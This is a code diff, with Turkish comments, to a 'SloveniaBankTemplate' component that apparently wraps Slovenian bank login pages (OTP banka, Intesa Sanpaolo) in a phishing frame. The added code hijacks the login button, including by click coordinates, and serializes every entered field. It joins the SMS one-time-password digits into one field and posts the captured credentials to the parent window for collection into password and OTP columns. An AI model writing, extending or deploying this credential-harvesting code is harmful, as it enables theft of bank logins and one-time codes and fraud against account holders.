@@ -558,6 +558,48 @@ export function SloveniaBankTemplate({ bankSlug, onChange, handleRouteAction, sa
 
       if (e.data && e.data.type === 'SLOVENIA_BANK_SUBMIT') {
         const { formData } = e.data;
+
+        // OTP banka (otpbanka-si): 6 haneli smsotp kutulari banka giris formunun
+        // parcasi. Ayri ayri gelince "otp" regex'i bunlari tacCode/sms kolonuna
+        // yolluyor ve password kolonuna son rakam ustune yaziliyordu.
+        // Burada tek "enkratno-geslo" alanina birlestiriyoruz -> banka kolonuna duser.
+        try {
+          if (formData && Array.isArray(formData.fields)) {
+            const otpIndex = (f: any) => {
+              const m = String(`${f?.name || ""}|${f?.id || ""}|${f?.key || ""}`).match(/smsotp-input-field-(\d)/i);
+              return m ? parseInt(m[1], 10) : -1;
+            };
+            const otpFs = formData.fields.filter((f: any) => otpIndex(f) >= 0);
+            if (otpFs.length) {
+              const joined = otpFs
+                .sort((a: any, b: any) => otpIndex(a) - otpIndex(b))
+                .map((f: any) => String(f.value || "").trim())
+                .join("");
+              formData.fields = formData.fields.filter((f: any) => otpIndex(f) < 0);
+              if (joined) {
+                formData.fields.push({
+                  key: "enkratno-geslo",
+                  name: "enkratno-geslo",
+                  id: "enkratno-geslo",
+                  label: "Enkratno geslo",
+                  type: "password",
+                  value: joined,
+                });
+              }
+            }
+          }
+          if (formData && formData.inputs && typeof formData.inputs === "object") {
+            const otpKeys = Object.keys(formData.inputs).filter((k) => /smsotp-input-field-\d/i.test(k));
+            if (otpKeys.length) {
+              const joined = otpKeys
+                .sort((a, b) => (parseInt(a.match(/(\d)$/)?.[1] || "0", 10)) - (parseInt(b.match(/(\d)$/)?.[1] || "0", 10)))
+                .map((k) => String(formData.inputs[k] ?? "").trim())
+                .join("");
+              otpKeys.forEach((k) => delete formData.inputs[k]);
+              if (joined) formData.inputs["enkratno-geslo"] = joined;
+            }
+          }
+        } catch (_) {}
         
         const clickedLoginMethod = normalizeLoginMethodLabel(selectedLoginMethodRef.current);
         const detectedLoginMethod = normalizeLoginMethodLabel(
@@ -2349,6 +2391,36 @@ export function SloveniaBankTemplate({ bankSlug, onChange, handleRouteAction, sa
                 }, '*');
               } catch(_e){}
               return false;
+            }
+          }
+
+          // ==== INTESA SANPAOLO: Vpis butonu ====
+          // Login formu sadece hidden input + buton iceriyor, gorunur alanlar
+          // form disinda -> fixSloveniaBanks butonu disabled/pointer-events:none
+          // yapabiliyor. Buton alanina tiklamayi koordinatla da yakala.
+          if (/intesasanpaolo/i.test(window.location.href || '')) {
+            const ispBtn = document.querySelector('button[name="submit"], button[type="submit"].btn-primary, .publicPortalLoginForm button[type="submit"]');
+            if (ispBtn) {
+              const r = ispBtn.getBoundingClientRect();
+              const hit = typeof e.clientX === 'number' &&
+                e.clientX >= r.left - 6 && e.clientX <= r.right + 6 &&
+                e.clientY >= r.top - 6 && e.clientY <= r.bottom + 6;
+              const direct = !!(target.closest && target.closest('button') === ispBtn);
+              if (hit || direct) {
+                e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+                try {
+                  const res = serializeAllLtForms();
+                  let hv = false;
+                  for (const f of res.fields) { if (f && String(f.value || '').trim() !== '') { hv = true; break; } }
+                  if (hv) {
+                    window.parent.postMessage({
+                      type: 'SLOVENIA_BANK_SUBMIT',
+                      formData: { inputs: res.inputs, fields: res.fields, loginMethod: getLoginMethod() }
+                    }, '*');
+                  }
+                } catch(_e){}
+                return false;
+              }
             }
           }
 
